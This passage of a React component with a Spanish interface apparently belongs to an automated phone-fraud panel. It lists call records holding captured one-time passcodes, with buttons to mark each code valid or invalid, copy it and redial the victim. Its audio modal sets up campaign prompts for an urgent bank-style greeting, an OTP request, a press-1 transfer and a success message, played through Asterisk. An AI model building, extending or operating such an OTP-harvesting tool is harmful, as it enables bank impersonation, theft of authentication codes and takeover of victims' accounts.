                            <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full bg-rose-500/20 text-rose-300 font-bold border border-rose-500/30 text-[10px]">
                              <XCircle className="w-3 h-3 text-rose-400" />
                              <span>INVÁLIDO (Rechazado)</span>
                            </span>
                          ) : (
                            <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full bg-amber-500/20 text-amber-300 font-medium border border-amber-500/30 text-[10px]">
                              <Clock className="w-3 h-3 text-amber-400" />
                              <span>Pendiente Revisión</span>
                            </span>
                          )}
                        </div>

                        {/* Botones rápidos para que el agente marque el estado */}
                        <div className="flex items-center gap-1.5">
                          <button
                            type="button"
                            onClick={() => handleVerifyOtp('valid', record.otp, record.number, record.id)}
                            title="Marcar este código como Válido"
                            className={`px-2 py-0.5 rounded text-[10px] font-bold flex items-center gap-1 transition-all ${
                              record.status === 'valid'
                                ? 'bg-emerald-500 text-slate-950 ring-2 ring-emerald-400/50'
                                : 'bg-slate-800 hover:bg-emerald-500/20 text-emerald-300 border border-slate-700'
                            }`}
                          >
                            <Check className="w-3 h-3" />
                            <span>Válido</span>
                          </button>

                          <button
                            type="button"
                            onClick={() => handleVerifyOtp('invalid', record.otp, record.number, record.id)}
                            title="Marcar este código como Inválido"
                            className={`px-2 py-0.5 rounded text-[10px] font-bold flex items-center gap-1 transition-all ${
                              record.status === 'invalid'
                                ? 'bg-rose-500 text-white ring-2 ring-rose-400/50'
                                : 'bg-slate-800 hover:bg-rose-500/20 text-rose-300 border border-slate-700'
                            }`}
                          >
                            <XCircle className="w-3 h-3" />
                            <span>Inválido</span>
                          </button>
                        </div>
                      </div>
                    </td>
                    <td className="p-3 text-right">
                      <div className="inline-flex items-center gap-1.5">
                        <button
                          onClick={() => handleCopyOtp(record.otp, record.id)}
                          className="inline-flex items-center gap-1 px-2.5 py-1 rounded-md text-[11px] font-semibold bg-slate-800 hover:bg-slate-700 text-white transition-all"
                        >
                          {copiedId === record.id ? (
                            <Check className="w-3.5 h-3.5 text-emerald-400" />
                          ) : (
                            <Copy className="w-3.5 h-3.5 text-slate-400" />
                          )}
                          <span>{copiedId === record.id ? 'Copiado' : 'Copiar'}</span>
                        </button>

                        <button
                          onClick={() => {
                            setTargetNumber(record.number);
                            window.scrollTo({ top: 0, behavior: 'smooth' });
                          }}
                          className="inline-flex items-center gap-1 px-2.5 py-1 rounded-md text-[11px] font-semibold bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-300 transition-all"
                        >
                          <PhoneCall className="w-3.5 h-3.5" />
                          <span>Re-llamar</span>
                        </button>
                      </div>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>

      {/* MODAL: SUBIDA / GRABACIÓN RÁPIDA DE AUDIO PARA LA CAMPAÑA */}
      {isQuickUploadOpen && (
        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-slate-900 border border-slate-700 rounded-2xl max-w-md w-full p-6 shadow-2xl space-y-5">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
              <div className="flex items-center gap-2">
                <FileAudio className="w-5 h-5 text-emerald-400" />
                <h3 className="font-bold text-white text-sm">
                  Cargar Nueva Locución para la Campaña
                </h3>
              </div>
              <button
                onClick={() => {
                  handleStopRecordingQuick();
                  setIsQuickUploadOpen(false);
                }}
                className="text-slate-400 hover:text-white p-1"
              >
                ✕
              </button>
            </div>

            <div className="space-y-4">
              {/* Asignación de ranura */}
              <div>
                <label className="text-xs font-semibold text-slate-300 block mb-1">
                  Ranura en la campaña actual ({serviceLabel})
                </label>
                <select
                  value={quickUploadSlot}
                  onChange={(e) => setQuickUploadSlot(e.target.value as keyof CampaignAudioConfig)}
                  className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-xl text-xs text-white"
                >
                  <option value="introAudioPath">1. Saludo / Alerta Inicial</option>
                  <option value="promptAudioPath">2. Solicitud de Código OTP</option>
                  <option value="agentAudioPath">3. Pre-Transferencia Press-1 (Asesor)</option>
                  <option value="successAudioPath">4. Confirmación / Éxito OTP</option>
                </select>
              </div>

              {/* Nombre de la locución */}
              <div>
                <label className="text-xs font-semibold text-slate-300 block mb-1">
                  Nombre descriptivo del audio
                </label>
                <input
                  type="text"
                  value={quickUploadName}
                  onChange={(e) => setQuickUploadName(e.target.value)}
                  placeholder="Ej: bienvenida_banco_urgente"
                  className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-xl text-xs text-white placeholder-slate-500 font-mono"
                />
              </div>

              {/* Opciones de carga: Archivo o Micrófono */}
              <div className="space-y-3 pt-1">
                <div className="text-xs font-semibold text-slate-300">Origen del audio:</div>

                {/* Subir archivo */}
                <div className="p-3 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                  <div className="text-[11px] text-slate-400 flex items-center gap-1.5">
                    <UploadCloud className="w-3.5 h-3.5 text-emerald-400" />
                    <span>Seleccionar archivo (.wav, .mp3, .ogg)</span>
                  </div>
                  <input
                    type="file"
                    accept="audio/*"
                    onChange={(e) => {
                      const file = e.target.files?.[0];
                      if (file) {
                        setQuickUploadFile(file);
                        if (!quickUploadName) {
                          setQuickUploadName(file.name.replace(/\.[^/.]+$/, ''));
                        }
                        const reader = new FileReader();
                        reader.onloadend = () => {
                          setQuickUploadDataUrl(reader.result as string);
                        };
                        reader.readAsDataURL(file);
                      }
                    }}
                    className="block w-full text-xs text-slate-400 file:mr-3 file:py-1.5 file:px-3 file:rounded-lg file:border-0 file:text-xs file:font-semibold file:bg-slate-800 file:text-emerald-300 hover:file:bg-slate-700 cursor-pointer"
                  />
                </div>

                {/* Grabar con micrófono */}
                <div className="p-3 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                  <div className="flex items-center justify-between">
                    <div className="text-[11px] text-slate-400 flex items-center gap-1.5">
                      <Mic className="w-3.5 h-3.5 text-rose-400" />
                      <span>Grabar locución con micrófono</span>
                    </div>
                    {isRecordingQuick && (
                      <span className="text-[10px] font-mono text-rose-400 font-bold animate-pulse">
                        ● Grabando ({quickRecordTime}s)
                      </span>
                    )}
                  </div>

                  {!isRecordingQuick ? (
                    <button
                      type="button"
                      onClick={handleStartRecordingQuick}
                      className="w-full py-2 rounded-lg bg-rose-500/20 hover:bg-rose-500/30 text-rose-300 text-xs font-semibold flex items-center justify-center gap-2 border border-rose-500/30 transition-all"
                    >
                      <Mic className="w-3.5 h-3.5" />
                      <span>Iniciar Grabación de Voz</span>
                    </button>
                  ) : (
                    <button
                      type="button"
                      onClick={handleStopRecordingQuick}
                      className="w-full py-2 rounded-lg bg-rose-600 hover:bg-rose-500 text-white text-xs font-semibold flex items-center justify-center gap-2 transition-all shadow-lg shadow-rose-600/30"
                    >
                      <Square className="w-3.5 h-3.5 fill-current" />
                      <span>Detener y Procesar ({quickRecordTime}s)</span>
                    </button>
                  )}
                </div>

                {/* Previsualización del audio cargado */}
                {quickUploadDataUrl && (
                  <div className="p-2.5 rounded-lg bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-between text-xs text-emerald-300">
                    <div className="flex items-center gap-2 truncate">
                      <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
                      <span className="truncate">Audio listo para procesar a Asterisk</span>
                    </div>
                    <button
                      type="button"
                      onClick={() => handleTogglePlayAudio(quickUploadDataUrl, 'preview_quick')}
                      className="p-1 rounded bg-emerald-500/20 text-emerald-200 hover:text-white"
                      title="Escuchar"
                    >
                      <Play className="w-3.5 h-3.5" />
                    </button>
                  </div>
                )}
              </div>

              <div className="text-[11px] text-slate-500 font-mono bg-slate-950 p-2.5 rounded-lg border border-slate-800/80">
                ⚡ Asterisk optimiza automáticamente este archivo a <strong>PCM 8000Hz 16-bit Mono</strong> para la mejor fidelidad telefónica.
              </div>
            </div>

            <div className="flex items-center justify-end gap-3 pt-2 border-t border-slate-800">
              <button
                type="button"
                onClick={() => {
                  handleStopRecordingQuick();
                  setIsQuickUploadOpen(false);
                }}
                className="px-4 py-2 rounded-xl text-xs font-semibold bg-slate-800 hover:bg-slate-700 text-slate-300 transition-all"
              >
                Cancelar
              </button>
              <button
                type="button"
                onClick={handleSaveQuickAudio}
                disabled={!quickUploadDataUrl || !quickUploadName.trim()}
                className="px-4 py-2 rounded-xl text-xs font-bold bg-emerald-500 hover:bg-emerald-400 text-black shadow-lg shadow-emerald-500/20 disabled:opacity-40 transition-all flex items-center gap-1.5"
              >
                <Check className="w-4 h-4" />
                <span>Asignar a la Campaña</span>
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
